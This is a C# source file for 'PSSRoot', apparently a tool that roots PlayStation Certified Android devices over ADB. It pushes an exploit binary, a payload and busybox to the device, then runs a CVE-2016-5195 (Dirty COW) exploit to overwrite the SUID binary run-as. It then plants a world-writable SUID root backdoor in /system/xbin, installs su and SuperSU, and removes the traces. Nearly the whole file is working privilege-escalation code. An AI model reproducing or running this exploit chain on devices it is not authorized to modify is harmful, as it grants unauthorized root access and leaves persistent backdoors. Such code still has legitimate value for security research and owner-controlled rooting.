namespace PSSRoot
{
    internal class Program
    {
        private static AdbHelper? adb = null;

        static string ANDROID_TMP_FOLDER    = "/data/local/tmp";
        static string ANDROID_SUID_BINARY   = "/system/bin/run-as";
        static string ANDROID_ROOT_BACKDOOR = "/system/xbin/root_backdoor";
        static string ANDROID_SU_INSTALL    = "/system/xbin/su";

        static string ANDROID_BUSYBOX        = ANDROID_TMP_FOLDER + "/" + "busybox";
        static string ANDROID_EXPLOIT        = ANDROID_TMP_FOLDER + "/" + "exploit";
        static string ANDROID_PAYLOAD        = ANDROID_TMP_FOLDER + "/" + "payload";
        static string ANDROID_SU             = ANDROID_TMP_FOLDER + "/" + "su";
        static string ANDROID_SUID_BACKUP    = ANDROID_TMP_FOLDER + "/" + "suid";

        static void uploadResource(byte[] data, string filename)
        {
            if (adb is null) throw new NullReferenceException("adb is null");

            string resTmpPath = Path.Combine(Path.GetTempPath(), "pssroot", "resource.bin");
            File.WriteAllBytes(resTmpPath, data);
            adb.Push(resTmpPath, filename);
            File.Delete(resTmpPath);

        }

        static void installResource(byte[] data)
        {
            if (adb is null) throw new NullReferenceException("adb is null");

            string resTmpPath = Path.Combine(Path.GetTempPath(), "pssroot", "resource.apk");
            File.WriteAllBytes(resTmpPath, data);
            adb.Install(resTmpPath);
            File.Delete(resTmpPath);

        }

        static void uploadExploitFiles()
        {
            Console.WriteLine("[*] Uploading busybox ...");
            uploadResource(RootResources.busybox, ANDROID_BUSYBOX);

            Console.WriteLine("[*] Uploading exploit ...");
            uploadResource(RootResources.exploit, ANDROID_EXPLOIT);

            Console.WriteLine("[*] Uploading payload ...");
            uploadResource(RootResources.payload, ANDROID_PAYLOAD);

            Console.WriteLine("[*] Uploading su ...");
            uploadResource(RootResources.su, ANDROID_SU);

        }

        static void mountSystemRo()
        {
            if (adb is null) return;
            Console.WriteLine("[*] Remounting /system/ as read-only ...");
            string res = adb.SendShellCmd(ANDROID_BUSYBOX + " mount -o ro,remount /system");
            //if (!adb.MatchesEmptyOutput(res)) { Console.Error.WriteLine("[*] error mounting /system as read-only: " + res); };
        }
        static void mountSystemRw()
        {
            if (adb is null) return;
            Console.WriteLine("[*] Remounting /system/ as read-write ...");
            string res = adb.SendShellCmd(ANDROID_BUSYBOX + " mount -o rw,remount /system");
            if (!adb.MatchesEmptyOutput(res)) { throw new Exception("[*] error mounting /system as read-write: " + res); };        
        }
        static void exitRootEnvironment()
        {
            if (adb is null) return;
            string res;
            Console.WriteLine("[*] Exiting root shell ...");
            do
            {
                res = adb.SendShellCmd("exit");
            }
            while (res.Contains('#'));

            adb.NotifyShellChanged();
        }

        static void installTemporyRootBackdoor()
        {
            if (adb is null) return;
            string res;

            Console.WriteLine("[*] Creating temporary root backdoor @ " + ANDROID_ROOT_BACKDOOR + " ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " cp \"" + ANDROID_PAYLOAD + "\" \"" + ANDROID_ROOT_BACKDOOR + "\"");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Changing owner of " + ANDROID_ROOT_BACKDOOR + " to root ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chown 0:0 \"" + ANDROID_ROOT_BACKDOOR + "\"");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Setting SUID permission for " + ANDROID_ROOT_BACKDOOR + " ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chmod 6777 \"" + ANDROID_ROOT_BACKDOOR + "\"");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);


        }

        static void backupSuidBinary()
        {
            if (adb is null) return;
            string res;

            Console.WriteLine("[*] Backing up " + ANDROID_SUID_BINARY + " ...");
            res = adb.Shell(ANDROID_BUSYBOX + " stat \"" + ANDROID_SUID_BACKUP + "\"");
            if (res.Contains("No such file or directory"))
            {
                res = adb.Shell(ANDROID_BUSYBOX + " cp -f \"" + ANDROID_SUID_BINARY + "\" \"" + ANDROID_SUID_BACKUP + "\"");
                if (res != String.Empty) throw new Exception("[*] failed to backup " + ANDROID_SUID_BACKUP + ": " + res);
            }
            else
            {
                Console.WriteLine("[*] Backup already exists...");
            }
        }

        static void runExploitToOverwriteSuidBinary()
        {
            if (adb is null) return;
            string res;

            do
            {
                Console.WriteLine("[*] Running CVE-2016-5195 ...");
                res = adb.Shell(ANDROID_EXPLOIT + " \"" + ANDROID_PAYLOAD + "\" \"" + ANDROID_SUID_BINARY + "\" --no-pad");

                Console.WriteLine("[*] Running overwritten suid binary ...");
                res = adb.SendShellCmd(ANDROID_SUID_BINARY);
                if (!res.Contains('#')) Console.Error.WriteLine("[*] suid: unexpected output: " + res + " ...");
            }
            while (!res.Contains('#')); // retry until get root shell (sometimes what it writes is corrupted.)

            adb.NotifyShellChanged();
        }

        static void switchFromRunAsToRootBackdoor()
        {
            if (adb is null) return;
            string res;

            // exit current root environment ...
            exitRootEnvironment();

            // enter root backdoor ...
            Console.WriteLine("[*] Entering " + ANDROID_ROOT_BACKDOOR + " ...");
            res = adb.SendShellCmd(ANDROID_ROOT_BACKDOOR);
            if (!res.Contains("#")) throw new Exception("[*] error getting root shell: " + res);

            adb.NotifyShellChanged();
        }

        static void restoreOriginalSuidBinary()
        {
            if (adb is null) return;
            string res;

            Console.WriteLine("[*] Restoring " + ANDROID_SUID_BINARY + " ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " cat \"" + ANDROID_SUID_BACKUP + "\" > " + ANDROID_SUID_BINARY);
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] error restoring original "+ANDROID_SUID_BINARY+": " + res);
        }

        static void removeBusyBox()
        {
            if (adb is null) return;

            string res;
            Console.WriteLine("[*] Removing " + ANDROID_BUSYBOX + " ...");
            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_BUSYBOX);
            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);
        }
        static void installSuBinary()
        {
            if (adb is null) return;
            string res;

            Console.WriteLine("[*] Copying " + ANDROID_SU + " to " + ANDROID_SU_INSTALL + " ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " cp -f \"" + ANDROID_SU + "\" \"" + ANDROID_SU_INSTALL + "\"");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Setting owner of " + ANDROID_SU_INSTALL + " to root ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chown 0:0  \"" + ANDROID_SU_INSTALL + "\"");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Setting SUID bit on " + ANDROID_SU_INSTALL + " ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " chmod 6755  \"" + ANDROID_SU_INSTALL + "\"");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Running su install ...");
            res = adb.SendShellCmd(ANDROID_SU_INSTALL+" --install");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Running su daemon ...");
            res = adb.SendShellCmd(ANDROID_SU_INSTALL+" --daemon");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Installing SuperSU.apk ...");
            installResource(RootResources.supersu);


        }

        static void cleanup()
        {
            if (adb is null) return;
            string res;

            Console.WriteLine("[*] Removing temporary root backdoor " + ANDROID_ROOT_BACKDOOR + " ...");
            res = adb.SendShellCmd(ANDROID_BUSYBOX + " rm -f \"" + ANDROID_ROOT_BACKDOOR + "\"");
            if (!adb.MatchesEmptyOutput(res)) throw new Exception("[*] ERR: " + res);

            Console.WriteLine("[*] Removing " + ANDROID_SU + " ...");
            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_SU);
            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);

            Console.WriteLine("[*] Removing " + ANDROID_EXPLOIT + " ...");
            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_EXPLOIT);
            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);

            Console.WriteLine("[*] Removing " + ANDROID_PAYLOAD + " ...");
            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_PAYLOAD);
            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);

            Console.WriteLine("[*] Removing " + ANDROID_SUID_BACKUP + " ...");
            res = adb.Shell(ANDROID_BUSYBOX + " rm -f " + ANDROID_SUID_BACKUP);
            if (res != String.Empty) throw new Exception("[*] rm failed: " + res);

        }
        static void Main(string[] args)
        {
            Console.WriteLine("[*] PSSRoot v1.0 by LiEnby ...");
            Console.WriteLine("[*] Root exploit for PlayStation Certified Devices!");

            try
            {
                string res;

                using (adb = new AdbHelper())
                {
                    
                    // upload required files to device
                    uploadExploitFiles();

                    // backup suid binaries ...
                    backupSuidBinary();

                    // get root shell via overwrtiing suid binary
                    runExploitToOverwriteSuidBinary();

                    // mount /system as read-write
                    mountSystemRw();

                    // install temporary root backdoor ...
                    installTemporyRootBackdoor();

                    // switch from 'run-as' overwritten by exploit, to root backdoor ..
                    switchFromRunAsToRootBackdoor();

                    // cleanup: restore original suid binary... 
                    restoreOriginalSuidBinary();

                    // install the 'su' binary file ...
                    installSuBinary();

                    // cleanup any files related to the exploitation process.
                    cleanup();

                    // remount /system as read-only ..
                    mountSystemRo();

                    // exit root shell
                    exitRootEnvironment();

                    // finally remove busybox binary
                    removeBusyBox();
                }

                Console.WriteLine("[*] Cleaning up pssroot temporary folder");
                Directory.Delete(Path.Combine(Path.GetTempPath(), "pssroot"), true);

                Console.WriteLine("[*] Done, launch SuperSU and click the \"Normal\" option when prompted to update");
                Thread.Sleep(5000);
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                Console.ReadKey();
            }


        }
    }
}
